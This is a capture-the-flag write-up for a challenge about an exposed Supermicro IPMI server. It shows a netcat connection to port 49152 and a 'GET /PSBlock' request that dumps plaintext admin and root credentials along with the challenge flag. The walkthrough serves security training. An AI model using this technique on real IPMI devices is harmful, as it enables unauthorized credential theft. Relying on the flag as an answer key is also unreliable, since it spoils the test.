IPMI Server Got Owned-350
We don’t need security on embedded devices anyway, right?
http://prod_atl_dc3_r49_u23.rogueterminal.com/
Challenge by Gus Naughton

The name says that it's an IPMI server. Clicking that link shows that it is a Supermicro device.

Goolging IPMI supermicro vulnerability returns some results.
http://arstechnica.com/security/2014/06/at-least-32000-servers-broadcast-admin-passwords-in-the-clear-advisory-warns/

Basically we connect to a port that allows us to fetch the password.

omegactf:~/workspace $ nc prod_atl_dc3_r49_u23.rogueterminal.com 
49152
ATEN SMASH-CLP System Management Shell, version 1.02

Copyright (c) 2008-2009 by ATEN International CO., Ltd.

All Rights Reserved



GET /PSBlock

=%}?

0adminADMIN**ADMIN**;TTroot**flag{1PM1_1S_MUY_1N$3CUR3_LOPL}**???%?v?i?o???DDD@??

Answer: 1PM1_1S_MUY_1N$3CUR3_LOPL
